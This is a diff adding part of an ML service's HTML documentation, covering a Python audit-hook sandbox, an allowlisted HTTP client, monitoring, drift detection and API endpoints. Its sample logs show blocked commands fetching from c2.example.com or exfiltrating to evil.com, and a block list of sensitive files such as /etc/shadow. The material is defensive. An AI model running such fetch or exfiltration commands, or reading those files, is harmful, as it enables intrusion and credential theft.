+       "error_rate": 0.05, "susp_path_ratio": 0.0, "blocked_ratio": 0.0,
+       "upload_attempts": 1, "unique_paths": 10, "total_requests": 50}}'</code></pre>
+
+    <div class="callout tip">
+      <strong>Bootstrap data</strong>
+      When fewer than 20 real IP records exist, the trainer generates a synthetic dataset (800 benign + 200 malicious samples) so the model is always available even on a fresh install.
+    </div>
+  </section>
+
+  <section id="runtime-audit">
+    <h2>Runtime Audit Hook</h2>
+    <p>The worker installs a <code class="inline">sys.addaudithook</code> into every Celery <code class="inline">ForkPoolWorker</code> process before the first task runs. CPython calls this hook for every auditable event — subprocess spawning, file opens, socket connections — regardless of where the call originates in the call stack.</p>
+
+    <div class="callout warn">
+      <strong>Irreversible by design</strong>
+      <code class="inline">sys.addaudithook</code> cannot be removed once installed. User code — including injected inference scripts and trainer plugins — cannot uninstall, replace, or silence it. This is CPython's intended security primitive for exactly this use case.
+    </div>
+
+    <h3>Policy table</h3>
+    <table>
+      <thead><tr><th>Audit event</th><th>Action</th><th>Details</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><code class="inline">subprocess.Popen</code></td>
+          <td><span class="badge required">BLOCK</span></td>
+          <td>Raises <code class="inline">PermissionError</code> unless the executable basename is in the allowlist. Covers all <code class="inline">subprocess.run/call/check_output/Popen</code> calls.</td>
+        </tr>
+        <tr>
+          <td><code class="inline">os.system</code></td>
+          <td><span class="badge required">BLOCK</span></td>
+          <td>Always blocked — no allowlist. Use <code class="inline">subprocess.run</code> with a whitelisted executable instead.</td>
+        </tr>
+        <tr>
+          <td><code class="inline">open</code> (sensitive paths)</td>
+          <td><span class="badge required">BLOCK</span></td>
+          <td>Raises <code class="inline">PermissionError</code> for <code class="inline">/etc/passwd</code>, <code class="inline">/etc/shadow</code>, <code class="inline">/etc/sudoers</code>, <code class="inline">/root/.ssh/</code>, <code class="inline">/etc/cron*</code>, <code class="inline">/proc/&lt;pid&gt;/mem|maps|environ</code>.</td>
+        </tr>
+        <tr>
+          <td><code class="inline">socket.connect</code></td>
+          <td><span class="badge optional">LOG</span></td>
+          <td>Logs a <code class="inline">WARNING</code> (host, port) for connections to hosts not in the internal allowlist. Does <strong>not</strong> raise — framework code (boto3, motor, MLflow) also connects and must not be broken. Use <code class="inline">iptables</code> for hard network enforcement.</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <h3>Subprocess executable allowlist</h3>
+    <p>Only the following basenames are permitted as subprocess arguments. Everything else — <code class="inline">curl</code>, <code class="inline">wget</code>, <code class="inline">nc</code>, <code class="inline">bash -c</code>, arbitrary binaries — is blocked immediately.</p>
+    <table>
+      <thead><tr><th>Executable</th><th>Purpose</th></tr></thead>
+      <tbody>
+        <tr><td><code class="inline">tesseract</code></td><td>OCR (Tesseract engine)</td></tr>
+        <tr><td><code class="inline">convert</code> / <code class="inline">identify</code></td><td>ImageMagick image conversion and inspection</td></tr>
+        <tr><td><code class="inline">ffmpeg</code> / <code class="inline">ffprobe</code></td><td>Video and audio processing</td></tr>
+        <tr><td><code class="inline">gs</code></td><td>Ghostscript PDF rendering</td></tr>
+        <tr><td><code class="inline">pdftotext</code> / <code class="inline">pdfimages</code></td><td>Poppler PDF extraction</td></tr>
+        <tr><td><code class="inline">python</code> / <code class="inline">python3</code></td><td>Sub-interpreter calls (multiprocessing internals)</td></tr>
+        <tr><td><code class="inline">sh</code></td><td>Shell calls made by certain Python packaging libs</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout tip">
+      <strong>Need a different tool?</strong>
+      Add its basename to <code class="inline">_ALLOWED_EXECUTABLES</code> in <code class="inline">app/core/worker_security.py</code> and restart the worker. Keep the list minimal — every entry is a potential attack surface.
+    </div>
+
+    <h3>What it looks like in logs</h3>
+    <pre><code><span class="cm"># Blocked subprocess (curl not in allowlist)</span>
+<span class="st">"worker_security_subprocess_blocked"</span>  executable=<span class="st">"curl"</span>  args=[<span class="st">"curl"</span>, <span class="st">"https://evil.com"</span>]
+
+<span class="cm"># Blocked os.system</span>
+<span class="st">"worker_security_os_system_blocked"</span>  command=<span class="st">"wget http://c2.example.com/payload"</span>
+
+<span class="cm"># Blocked sensitive file open</span>
+<span class="st">"worker_security_sensitive_open_blocked"</span>  path=<span class="st">"/etc/shadow"</span>  mode=<span class="st">"r"</span>
+
+<span class="cm"># Logged (not blocked) unexpected socket connection</span>
+<span class="st">"worker_security_external_connect"</span>  host=<span class="st">"203.0.113.50"</span>  port=<span class="nu">4444</span>
+
+<span class="cm"># Confirmed installed in both worker processes at startup</span>
+<span class="st">"worker_security_hook_installed"</span>  pid=<span class="nu">8</span>
+<span class="st">"worker_security_hook_installed"</span>  pid=<span class="nu">9</span></code></pre>
+
+    <h3>Layered defence — what the hook does not replace</h3>
+    <p>The audit hook is a Python-level control. It does not intercept syscalls made by C extensions (e.g. a compiled PyTorch kernel writing a file directly). For defence-in-depth, combine it with:</p>
+    <ul style="margin: 12px 0 0 20px; color: #c8d0df; line-height: 2;">
+      <li><strong>iptables / network namespace</strong> — hard-block all worker egress except to internal services</li>
+      <li><strong>seccomp profile</strong> — restrict allowed syscalls at the kernel level</li>
+      <li><strong>ClamAV</strong> — signature-based scan before any code reaches the worker</li>
+      <li><strong>SafeHttpClient</strong> — allowlist-enforced HTTP for outbound API calls inside scripts</li>
+    </ul>
+  </section>
+
+  <section id="safe-http">
+    <h2>SafeHttpClient</h2>
+    <p>A monitored <code class="inline">httpx</code> wrapper in <code class="inline">app/core/safe_http.py</code> for making outbound HTTP calls inside inference scripts and trainers. Every request is validated against a host allowlist before any network connection is attempted, and every response is logged with structured fields.</p>
+
+    <h3>Quick start</h3>
+    <pre><code><span class="kw">from</span> app.core.safe_http <span class="kw">import</span> SafeHttpClient
+
+<span class="cm"># Declare the hosts your script is allowed to reach</span>
+<span class="fn">client</span> = SafeHttpClient(allowed_hosts={<span class="st">"api.roboflow.com"</span>, <span class="st">"huggingface.co"</span>})
+
+<span class="cm"># GET — raises HostNotAllowedError immediately if host not in allowlist</span>
+resp = client.<span class="fn">get</span>(<span class="st">"https://api.roboflow.com/dataset/meter/1"</span>)
+data = resp.<span class="fn">json</span>()
+
+<span class="cm"># POST with JSON body</span>
+resp = client.<span class="fn">post</span>(<span class="st">"https://api.roboflow.com/infer"</span>, json={<span class="st">"image"</span>: b64})
+resp.<span class="fn">raise_for_status</span>()
+
+<span class="cm"># Module-level default client (uses the built-in ML-service whitelist)</span>
+<span class="kw">from</span> app.core.safe_http <span class="kw">import</span> http
+resp = http.<span class="fn">get</span>(<span class="st">"https://huggingface.co/api/models/bert-base-uncased"</span>)</code></pre>
+
+    <h3>Default host allowlist</h3>
+    <p>The module-level <code class="inline">http</code> client permits these hosts without any extra configuration:</p>
+    <table>
+      <thead><tr><th>Host</th><th>Purpose</th></tr></thead>
+      <tbody>
+        <tr><td><code class="inline">huggingface.co</code></td><td>HuggingFace model hub</td></tr>
+        <tr><td><code class="inline">roboflow.com</code> · <code class="inline">api.roboflow.com</code></td><td>Roboflow cloud inference + dataset API</td></tr>
+        <tr><td><code class="inline">api.openai.com</code></td><td>OpenAI vision / embeddings</td></tr>
+        <tr><td><code class="inline">api.anthropic.com</code></td><td>Anthropic Claude API</td></tr>
+        <tr><td><code class="inline">vision.googleapis.com</code> · <code class="inline">aiplatform.googleapis.com</code></td><td>Google Cloud Vision / Vertex AI</td></tr>
+        <tr><td><code class="inline">cognitiveservices.azure.com</code></td><td>Azure Cognitive Services</td></tr>
+        <tr><td><code class="inline">rekognition.*.amazonaws.com</code> · <code class="inline">textract.*.amazonaws.com</code></td><td>AWS Rekognition / Textract</td></tr>
+        <tr><td><code class="inline">minio</code> · <code class="inline">mlflow</code> · <code class="inline">mongodb</code> · <code class="inline">redis</code></td><td>Internal Docker services</td></tr>
+      </tbody>
+    </table>
+
+    <h3>What every request logs</h3>
+    <pre><code><span class="cm"># Successful request</span>
+<span class="st">"safe_http_request"</span>  method=<span class="st">"POST"</span>  host=<span class="st">"api.roboflow.com"</span>
+  url=<span class="st">"https://api.roboflow.com/meter/1/infer"</span>
+  status=<span class="nu">200</span>  response_bytes=<span class="nu">1842</span>  latency_ms=<span class="nu">312.4</span>
+
+<span class="cm"># Blocked — host not in allowlist (raised before any TCP connection)</span>
+<span class="st">"safe_http_host_blocked"</span>  host=<span class="st">"evil.com"</span>  url=<span class="st">"https://evil.com/exfil"</span>
+  allowed=[<span class="st">"api.roboflow.com"</span>, <span class="st">"huggingface.co"</span>]
+
+<span class="cm"># Blocked — response too large</span>
+<span class="st">"safe_http_response_too_large"</span>  response_bytes=<span class="nu">62914560</span>  limit=<span class="nu">52428800</span></code></pre>
+
+    <h3>Configuration</h3>
+    <table>
+      <thead><tr><th>Parameter</th><th>Default</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td><code class="inline">allowed_hosts</code></td><td>Built-in ML whitelist</td><td>Set of hostnames permitted. Subdomain suffix matching is supported (e.g. <code class="inline">huggingface.co</code> also allows <code class="inline">cdn-lfs.huggingface.co</code>).</td></tr>
+        <tr><td><code class="inline">max_body_bytes</code></td><td>52 428 800 (50 MB)</td><td>Response body size cap. Larger responses raise <code class="inline">ResponseTooLargeError</code>.</td></tr>
+        <tr><td><code class="inline">connect_timeout</code></td><td>10 s</td><td>TCP connect timeout.</td></tr>
+        <tr><td><code class="inline">read_timeout</code></td><td>60 s</td><td>Response read timeout.</td></tr>
+        <tr><td><code class="inline">extra_headers</code></td><td>—</td><td>Dict merged into every request (e.g. <code class="inline">{"Authorization": "Bearer …"}</code>).</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout warn">
+      <strong>Using raw httpx / requests inside inference scripts</strong>
+      Raw <code class="inline">httpx</code> or <code class="inline">requests</code> calls are not blocked at the Python level (the audit hook only blocks <code class="inline">subprocess</code> and sensitive file opens). Use <code class="inline">SafeHttpClient</code> voluntarily for its logging and host validation. The <code class="inline">socket.connect</code> audit hook will log — but not block — any connection to an unexpected host, producing a warning in the worker logs.
+    </div>
+  </section>
+
+  <hr>
+
+  <!-- ═══ REFERENCE ═══ -->
+
+  <!-- ═══ MONITORING OVERVIEW ═══ -->
+  <section id="monitoring-overview">
+    <h2>Monitoring</h2>
+
+    <p>The ML service ships three observability layers that require zero extra infrastructure:</p>
+
+    <div class="card-grid">
+      <div class="card">
+        <div class="icon">📋</div>
+        <h3>Inference Logging</h3>
+        <p>Every prediction — inputs, outputs, latency, error, org_id — is persisted to <code class="inline">inference_logs</code> automatically. Logs are queryable and correctable via the API.</p>
+      </div>
+      <div class="card">
+        <div class="icon">📊</div>
+        <h3>Performance Monitoring</h3>
+        <p>The scheduler computes hourly performance snapshots (request volume, error rate, p95/p99 latency) per model. A rolling summary endpoint provides live stats for any time window.</p>
+      </div>
+      <div class="card">
+        <div class="icon">🔔</div>
+        <h3>Data Drift Detection</h3>
+        <p>Stores a baseline feature distribution from recent inferences. Every 6 hours (or on demand) it compares the current window against the baseline — KS test for numerics, PSI for categoricals — and raises <code class="inline">DriftAlert</code> records with SSE notifications.</p>
+      </div>
+    </div>
+
+    <h3>Architecture at a glance</h3>
+    <pre><code>Inference call
+    │
+    ├─ inference_service.predict()
+    │       └─ writes  InferenceLog  (inputs, outputs, latency, error)
+    │
+    ├─ APScheduler  :00 every hour
+    │       └─ performance_service.compute_all_hourly_snapshots()
+    │               └─ writes  PerformanceSnapshot  (aggregated stats)
+    │
+    └─ APScheduler  :05 every 6 hours
+            └─ drift_service.run_all_drift_checks()
+                    ├─ reads   DriftBaseline   (reference distribution)
+                    ├─ writes  DriftAlert      (when threshold exceeded)
+                    └─ publishes  SSE  drift_alert  event</code></pre>
+
+    <h3>Collections written</h3>
+    <table>
+      <thead><tr><th>Collection</th><th>Written by</th><th>Purpose</th></tr></thead>
+      <tbody>
+        <tr><td><code class="inline">inference_logs</code></td><td>Every inference call</td><td>Full input/output audit trail; source for all monitoring</td></tr>
+        <tr><td><code class="inline">performance_snapshots</code></td><td>Hourly scheduler</td><td>Pre-aggregated request volume + latency + error stats</td></tr>
+        <tr><td><code class="inline">drift_baselines</code></td><td>Manual API call</td><td>Reference feature distribution (one doc per trainer)</td></tr>
+        <tr><td><code class="inline">drift_alerts</code></td><td>Drift check (scheduled / manual)</td><td>Alert per drifted feature; lifecycle: open → acknowledged → resolved</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- ═══ PERFORMANCE MONITORING ═══ -->
+  <section id="performance-monitoring">
+    <h2>Performance Monitoring</h2>
+
+    <p>Hourly snapshots are computed automatically for every model that had at least one inference in the window. No configuration required — just deploy a model and the scheduler handles the rest.</p>
+
+    <h3>What is captured per window</h3>
+    <table>
+      <thead><tr><th>Field</th><th>Type</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td><code class="inline">total_requests</code></td><td>int</td><td>Number of inference calls in the window</td></tr>
+        <tr><td><code class="inline">error_count</code></td><td>int</td><td>Calls that raised an exception</td></tr>
+        <tr><td><code class="inline">error_rate</code></td><td>float 0–1</td><td><code class="inline">error_count / total_requests</code></td></tr>
+        <tr><td><code class="inline">latency_avg</code></td><td>ms</td><td>Mean latency across all calls in window</td></tr>
+        <tr><td><code class="inline">latency_p50</code></td><td>ms</td><td>Median latency</td></tr>
+        <tr><td><code class="inline">latency_p95</code></td><td>ms</td><td>95th-percentile latency</td></tr>
+        <tr><td><code class="inline">latency_p99</code></td><td>ms</td><td>99th-percentile latency — watch this for tail-latency issues</td></tr>
+        <tr><td><code class="inline">latency_max</code></td><td>ms</td><td>Worst single call latency</td></tr>
+        <tr><td><code class="inline">top_errors</code></td><td>list</td><td>Up to 5 most frequent error messages + counts</td></tr>
+        <tr><td><code class="inline">unique_orgs</code></td><td>int</td><td>Distinct <code class="inline">caller_org_id</code> values</td></tr>
+        <tr><td><code class="inline">unique_sessions</code></td><td>int</td><td>Distinct <code class="inline">session_id</code> values</td></tr>
+      </tbody>
+    </table>
+
+    <h3>Monitoring API</h3>
+
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/monitoring/overview</code><span>All-models 24h summary (request volume, error rate, avg latency)</span></div>
+    <pre><code><span class="cm"># Example response</span>
+{
+  <span class="st">"models"</span>: [
+    {
+      <span class="st">"trainer_name"</span>: <span class="st">"water-meter-ocr"</span>,
+      <span class="st">"total_requests"</span>: <span class="nu">428</span>,
+      <span class="st">"error_count"</span>: <span class="nu">3</span>,
+      <span class="st">"error_rate"</span>: <span class="nu">0.007</span>,
+      <span class="st">"avg_latency_ms"</span>: <span class="nu">312.5</span>,
+      <span class="st">"max_latency_ms"</span>: <span class="nu">1840.2</span>
+    }
+  ]
+}</code></pre>
+
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/monitoring/performance/{trainer}</code><span>Hourly snapshots — ?hours=24 (default) up to 168 (1 week)</span></div>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/monitoring/performance/{trainer}/summary</code><span>Live rolling summary — ?hours=24 (computed from raw logs, no cache)</span></div>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/monitoring/performance/{trainer}/snapshot</code><span>Force-compute a snapshot now — ?hours_back=1</span></div>
+
+    <h3>Reading the hourly snapshots</h3>
+    <pre><code><span class="cm"># Fetch last 24 hours of hourly snapshots</span>
+curl http://localhost:8030/api/v1/monitoring/performance/water-meter-ocr
+
+<span class="cm"># Live rolling summary (last 6 hours)</span>
+curl "http://localhost:8030/api/v1/monitoring/performance/water-meter-ocr/summary?hours=6"
+
+<span class="cm"># Force a snapshot for the past 2 hours (e.g. after backfilling logs)</span>
+curl -X POST "http://localhost:8030/api/v1/monitoring/performance/water-meter-ocr/snapshot?hours_back=2"</code></pre>
+
+    <div class="callout info">
+      <strong>Tip — integrate with Grafana</strong>
+      The <code class="inline">/monitoring/overview</code> endpoint is suitable as a Prometheus text-format data source adapter or a Grafana JSON datasource. Poll it every minute and graph <code class="inline">error_rate</code> and <code class="inline">avg_latency_ms</code> per model.
+    </div>
+  </section>
+
+  <!-- ═══ DRIFT DETECTION ═══ -->
+  <section id="drift-detection">
+    <h2>Data Drift Detection</h2>
+
+    <p>Data drift occurs when the distribution of inference inputs changes significantly from when the model was trained (or baselined). The drift service detects this automatically and fires notifications so you know when to retrain.</p>
+
+    <h3>How it works</h3>
+    <div class="steps">
+      <div class="step">
+        <div class="step-body">
+          <h4>Set a baseline</h4>
+          <p>Call <code class="inline">POST /monitoring/drift/{trainer}/baseline</code> once the model has accumulated enough inferences (default: 500 most recent successful calls). The service computes per-feature statistics and stores them in <code class="inline">drift_baselines</code>.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-body">
+          <h4>Scheduled drift checks</h4>
+          <p>Every 6 hours the scheduler calls <code class="inline">drift_service.run_all_drift_checks()</code> for every trainer that has a baseline. It compares the last 200 successful inferences against the baseline distribution.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-body">
+          <h4>Alert raised &amp; SSE event published</h4>
+          <p>If any feature exceeds its threshold, a <code class="inline">DriftAlert</code> document is written and a <code class="inline">drift_alert</code> SSE event is published on the <code class="inline">ml:events</code> Redis channel.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-body">
+          <h4>Review &amp; resolve</h4>
+          <p>Query alerts via <code class="inline">GET /monitoring/drift/{trainer}/alerts</code>. Acknowledge or resolve via <code class="inline">PATCH /monitoring/drift/alerts/{id}</code>. Re-train the model, then refresh the baseline.</p>
+        </div>
+      </div>
+    </div>
+
+    <h3>Detection methods</h3>
+    <table>
+      <thead><tr><th>Feature type</th><th>Method</th><th>Default threshold</th><th>When triggered</th></tr></thead>
+      <tbody>
+        <tr>
+          <td>Numeric</td>
+          <td><strong>KS test</strong> (scipy) or Z-score (fallback)</td>
+          <td>KS ≥ 0.20 | |Z| ≥ 2.5</td>
+          <td>Shape of distribution has shifted (not just mean)</td>
+        </tr>
+        <tr>
+          <td>Categorical</td>
+          <td><strong>PSI</strong> — Population Stability Index</td>
+          <td>PSI ≥ 0.20</td>
+          <td>Class proportions have meaningfully shifted (0.1–0.2 = moderate; &gt;0.2 = significant)</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="callout info">
+      <strong>scipy is optional</strong>
+      If <code class="inline">scipy</code> is not installed the KS test falls back to a Z-score mean-shift comparison. Install scipy for full two-sample KS testing: <code class="inline">pip install scipy</code>.
+    </div>
+
+    <h3>Which features are tracked</h3>
+    <p>Only <em>scalar input fields</em> from the inference <code class="inline">inputs</code> dict are tracked. Fields are automatically excluded if:</p>
+    <ul style="margin: 0 0 16px 20px; color: #c8d0df;">
+      <li>The key ends with <code class="inline">_b64</code> or <code class="inline">_key</code> (binary/image data)</li>
+      <li>The key is <code class="inline">file_b64</code></li>
+      <li>The string value is longer than 256 characters</li>
+      <li>Fewer than 30 samples were observed for that feature</li>
+    </ul>
+
+    <h3>Drift API</h3>
+
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/monitoring/drift/{trainer}/baseline</code><span>Current baseline — feature names, sample count, statistics</span></div>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/monitoring/drift/{trainer}/baseline</code><span>Set (or refresh) baseline — body: <code class="inline">{ "sample_count": 500 }</code></span></div>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/monitoring/drift/{trainer}/check</code><span>Run drift check now — body: <code class="inline">{ "sample_count": 200, "hours": 6 }</code></span></div>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/monitoring/drift/{trainer}/alerts</code><span>List alerts — ?status=open|acknowledged|resolved&amp;limit=50</span></div>
+    <div class="endpoint"><span class="method patch">PATCH</span><code>/api/v1/monitoring/drift/alerts/{id}</code><span>Acknowledge or resolve — body: <code class="inline">{ "status": "acknowledged", "notes": "..." }</code></span></div>
+
+    <h3>Quick start workflow</h3>
+    <pre><code><span class="cm"># 1. After the model has processed ≥ 100 requests, set a baseline</span>
+curl -X POST http://localhost:8030/api/v1/monitoring/drift/water-meter-ocr/baseline \
+  -H "Content-Type: application/json" \
+  -d '{"sample_count": 200}'
+
+<span class="cm"># Response — baseline built from 200 recent calls</span>
+{
+  <span class="st">"trainer_name"</span>: <span class="st">"water-meter-ocr"</span>,
+  <span class="st">"sample_count"</span>: <span class="nu">200</span>,
+  <span class="st">"features"</span>: [<span class="st">"confidence_threshold"</span>],
+  <span class="st">"created_at"</span>: <span class="st">"2026-03-13T08:00:00Z"</span>
+}
+
+<span class="cm"># 2. Run a manual drift check (normally done by the scheduler)</span>
+curl -X POST http://localhost:8030/api/v1/monitoring/drift/water-meter-ocr/check \
+  -H "Content-Type: application/json" \
+  -d '{"sample_count": 200, "hours": 6}'
+
+<span class="cm"># Response when drift detected</span>
+{
+  <span class="st">"alerts_raised"</span>: <span class="nu">1</span>,
+  <span class="st">"alerts"</span>: [{
+    <span class="st">"feature_name"</span>: <span class="st">"confidence_threshold"</span>,
+    <span class="st">"drift_method"</span>: <span class="st">"ks_test"</span>,
+    <span class="st">"drift_score"</span>: <span class="nu">0.38</span>,
+    <span class="st">"threshold"</span>: <span class="nu">0.2</span>,
+    <span class="st">"details"</span>: {
+      <span class="st">"ks_statistic"</span>: <span class="nu">0.38</span>,
+      <span class="st">"p_value"</span>: <span class="nu">0.0002</span>,
+      <span class="st">"baseline_mean"</span>: <span class="nu">0.5</span>,
+      <span class="st">"current_mean"</span>: <span class="nu">0.73</span>
+    }
+  }]
+}
+
+<span class="cm"># 3. Acknowledge the alert</span>
+curl -X PATCH http://localhost:8030/api/v1/monitoring/drift/alerts/&lt;alert_id&gt; \
+  -H "Content-Type: application/json" \
+  -d '{"status": "acknowledged", "notes": "Investigating — users changed default threshold"}'
+
+<span class="cm"># 4. After retraining, refresh the baseline</span>
+curl -X POST http://localhost:8030/api/v1/monitoring/drift/water-meter-ocr/baseline</code></pre>
+
+    <h3>SSE real-time notification</h3>
+    <p>When a drift alert is raised the service publishes on the <code class="inline">ml:events</code> Redis channel (same channel used for inference events). Subscribe via the SSE endpoint:</p>
+    <pre><code><span class="cm"># Stream all ML events including drift alerts</span>
+curl -N http://localhost:8030/api/v1/events
+
+<span class="cm"># Example drift_alert event</span>
+event: drift_alert
+data: {
+  "trainer_name": "rent-predictor",
+  "feature_name": "bedrooms",
+  "drift_method": "ks_test",
+  "drift_score": 0.31,
+  "threshold": 0.2,
+  "alert_id": "65f3a...",
+  "detected_at": "2026-03-13T14:05:00Z"
+}</code></pre>
+
+    <h3>Alert lifecycle</h3>
+    <table>
+      <thead><tr><th>Status</th><th>Meaning</th><th>Transition</th></tr></thead>
+      <tbody>
+        <tr><td><code class="inline">open</code></td><td>Newly raised — action required</td><td>PATCH → <code class="inline">acknowledged</code> or <code class="inline">resolved</code></td></tr>
+        <tr><td><code class="inline">acknowledged</code></td><td>Seen — investigation in progress</td><td>PATCH → <code class="inline">resolved</code></td></tr>
+        <tr><td><code class="inline">resolved</code></td><td>Fixed (baseline refreshed or model retrained)</td><td>Terminal</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout warn">
+      <strong>Baseline drift</strong>
+      The baseline is a snapshot — it does not update automatically. After retraining a model or deploying a new version, always call <code class="inline">POST /monitoring/drift/{trainer}/baseline</code> to reset the reference distribution.
+    </div>
+  </section>
+
+  <section id="env-vars">
+    <h2>Environment Variables Reference</h2>
+    <table>
+      <thead><tr><th>Variable</th><th>Default</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td><code class="inline">MLFLOW_TRACKING_URI</code></td><td>http://mlflow:5000</td><td>MLflow server for model registry</td></tr>
+        <tr><td><code class="inline">S3_ENDPOINT_URL</code></td><td>http://minio:9000</td><td>MinIO endpoint (internal)</td></tr>
+        <tr><td><code class="inline">S3_PUBLIC_ENDPOINT_URL</code></td><td>http://localhost:9000</td><td>MinIO endpoint for presigned URLs (browser-accessible)</td></tr>
+        <tr><td><code class="inline">S3_ACCESS_KEY</code></td><td>minioadmin</td><td>MinIO access key</td></tr>
+        <tr><td><code class="inline">S3_SECRET_KEY</code></td><td>minioadmin</td><td>MinIO secret key</td></tr>
+        <tr><td><code class="inline">S3_BUCKET</code></td><td>pms-ml</td><td>Default ML storage bucket</td></tr>
+        <tr><td><code class="inline">AWS_ACCESS_KEY_ID</code></td><td>minioadmin</td><td>Required by MLflow for artifact storage</td></tr>
+        <tr><td><code class="inline">AWS_SECRET_ACCESS_KEY</code></td><td>minioadmin</td><td>Required by MLflow for artifact storage</td></tr>
+        <tr><td><code class="inline">MLFLOW_S3_ENDPOINT_URL</code></td><td>http://minio:9000</td><td>Tells MLflow to use MinIO instead of real S3</td></tr>
+        <tr><td><code class="inline">ROBOFLOW_API_KEY</code></td><td>—</td><td>Set in .env for Roboflow cloud inference</td></tr>
+        <tr><td><code class="inline">CUDA_DEVICE</code></td><td>auto</td><td>Force specific device: cpu, cuda, cuda:0</td></tr>
+        <tr><td><code class="inline">TRAINER_PLUGIN_DIR</code></td><td>/app/trainers</td><td>Shared volume where plugin .py files are stored</td></tr>
+        <tr><td><code class="inline">MONGODB_URL</code></td><td>mongodb://mongodb:27017</td><td>MongoDB connection for IP records and request logs</td></tr>
+        <tr><td><code class="inline">MONGODB_DATABASE</code></td><td>pms_ml</td><td>Database name (ip_records + request_logs collections)</td></tr>
+        <tr><td><code class="inline">SECURITY_WHITELIST_IPS</code></td><td>—</td><td>Comma-separated IP prefixes that are never scored or banned (e.g. "203.0.113.50,198.51.")</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <section id="all-endpoints">
+    <h2>All API Endpoints</h2>
+
+    <h3>Inference</h3>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/inference/{name}</code><span>JSON body inference</span></div>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/inference/{name}/upload</code><span>File upload inference (image, PDF, CSV…)</span></div>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/inference/{name}/schema</code><span>Input schema for callers</span></div>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/inference/logs/{name}</code><span>Inference history (paginated)</span></div>
+
+    <h3>Models (Deployments)</h3>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/models/deploy-pretrained/zip</code><span>Deploy from ZIP archive ★ recommended</span></div>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/models/deploy-pretrained/upload</code><span>Upload raw model file</span></div>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/models/deploy-pretrained</code><span>URI sources: HuggingFace / S3 / URL / MLflow</span></div>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/models</code><span>List active deployments</span></div>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/models/{id}/set-default</code><span>Make a version the default</span></div>
+    <div class="endpoint"><span class="method delete">DELETE</span><code>/api/v1/models/{id}</code><span>Delete deployment record</span></div>
+    <div class="endpoint"><span class="method delete">DELETE</span><code>/api/v1/models</code><span>Delete all deployment records</span></div>
+
+    <h3>Training Jobs</h3>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/training/start</code><span>Trigger training</span></div>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/training/start-with-data</code><span>Upload data + trigger training</span></div>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/training/jobs</code><span>List jobs (filter: trainer_name, status)</span></div>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/training/jobs/{id}</code><span>Get job details + error message</span></div>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/training/jobs/{id}/rerun</code><span>Re-queue a failed/completed job</span></div>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/training/jobs/{id}/cancel</code><span>Cancel a queued job</span></div>
+    <div class="endpoint"><span class="method delete">DELETE</span><code>/api/v1/training/jobs/{id}</code><span>Delete job record</span></div>
+    <div class="endpoint"><span class="method delete">DELETE</span><code>/api/v1/training/jobs</code><span>Delete all job records</span></div>
+
+    <h3>Trainers (Self-training plugins)</h3>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/trainers/upload</code><span>Upload .py file</span></div>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/trainers/scan</code><span>Re-scan plugin directory</span></div>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/trainers</code><span>List registered trainers</span></div>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/trainers/{name}</code><span>Get trainer metadata</span></div>
+    <div class="endpoint"><span class="method delete">DELETE</span><code>/api/v1/trainers/{name}</code><span>Deactivate a trainer</span></div>
+
+    <h3>Monitoring</h3>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/monitoring/overview</code><span>All-models 24h summary (volume, error rate, latency)</span></div>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/monitoring/performance/{trainer}</code><span>Hourly snapshots — ?hours=24&amp;window_type=hourly</span></div>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/monitoring/performance/{trainer}/summary</code><span>Live rolling summary — ?hours=24</span></div>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/monitoring/performance/{trainer}/snapshot</code><span>Force-compute hourly snapshot — ?hours_back=1</span></div>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/monitoring/drift/{trainer}/baseline</code><span>Current baseline feature statistics</span></div>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/monitoring/drift/{trainer}/baseline</code><span>Set baseline — body: { "sample_count": 500 }</span></div>
+    <div class="endpoint"><span class="method post">POST</span><code>/api/v1/monitoring/drift/{trainer}/check</code><span>Run drift check — body: { "sample_count": 200, "hours": 6 }</span></div>
+    <div class="endpoint"><span class="method get">GET</span><code>/api/v1/monitoring/drift/{trainer}/alerts</code><span>List drift alerts — ?status=open|acknowledged|resolved</span></div>
